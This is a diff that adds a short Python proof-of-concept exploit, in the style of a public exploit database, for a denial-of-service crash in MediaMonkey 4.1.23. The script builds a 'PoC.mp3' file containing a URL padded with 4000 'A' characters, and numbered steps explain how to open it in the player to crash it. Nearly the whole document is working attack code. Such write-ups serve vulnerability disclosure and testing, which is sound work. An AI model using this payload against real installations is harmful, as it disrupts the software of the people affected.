@@ -1,0 +1,24 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: MediaMonkey 4.1.23 - URL Denial of Service (PoC)
+# Date: 13/02/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: https://www.mediamonkey.com/
+# Software Link: https://www.mediamonkey.com/sw/MediaMonkey_4.1.23.1881.exe
+# Version: 4.1.23.1881
+# Tested on: Windows 10
+
+# Proof of Concept:
+# 1.- Run the python script "MediaMonkey.py", it will create a new file "PoC.mp3"
+# 2.- Open MediaMonkey.exe 
+# 3.- Go to File > Open URL or File...
+# 4.- Click on button -> Browse... and select the 'PoC.mp3' file created
+# 5.- Crashed
+
+buffer = "http://127.0.0.1/"
+badstr = "\x41" * 4000
+buffer += badstr
+buffer += ".mp3"
+
+f = open ("PoC.mp3", "w")
+f.write(buffer)
+f.close()
